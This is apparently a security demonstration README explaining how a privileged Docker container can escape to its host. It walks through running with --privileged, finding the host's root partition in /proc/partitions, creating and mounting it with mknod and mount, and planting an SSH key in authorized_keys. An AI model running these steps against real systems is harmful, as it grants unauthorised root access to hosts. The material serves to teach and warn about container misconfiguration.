# Misconfiguration Container Breakout

This demonstrates how running a priviliged container or running containers with lax seccomp policies and capabilities could lead to container breakout.

## Reproducing the attack

The simplest way to demonstrate this is issue is to run your Docker container with `--privileged`. The enables all capabilites, removes the seccomp profile and runs as root inside the container.

```bash
docker run -it --rm --privileged ubuntu:latest /bin/bash
```

Now that you are in the container, you want to access the root filesystem, of the host that the container is running on. 

_Note_ there are other ways to break out of the container, this is just one.

### Identify the root filesystem

Information about the host is mapped into the Docker container since the `/proc/partitions` file is mapped into the container. Read the contents of this file to pick your target:

```bash
cat /proc/partitions

major minor  #blocks  name                                                                                                                                                        
                                                                                                                                                                                  
 253        0   26214400 vda                                                                                                                                                      
 253        1   26100719 vda1                                                                                                                                                     
 253       14       4096 vda14                                                                                                                                                    
 253       15     108544 vda15 

```

This host has one disk `vda` and three partitions, `vda1`, `vda14`, `vda15`. Based on the size of `vda1` it is probably the root filesystem. So we will try and mount this to read files.

### Mount the filesystem

We will use the `mknod` utility here to demonstrate the dangers of not blocking system calls through seccomp. 
You need to specify the correct major and minor numbers for the partition, these will likely be different on the host you are testing.

```bash
mknod blk b 253 1
```

Now that we have blockdevice, we can mount it and read/write to it.

```bash
mkdir rootfs
mount blk rootfs
```

At this point it becomes really easy to interact with the underlying filesystem. We now have unrestricted access to the filesystem and can perform read/write opperations. Because our container is running as privileged and we are root inside the container (and that root user maps to the root user outside the container) it is possible to access any file.

### Full breakout

To fully breakout at this point you can use the usual techniques to go from file write to code execution in Linux. What normally works pretty well is to simply write a SSH key to the `authorized_keys`file and SSH into the host.

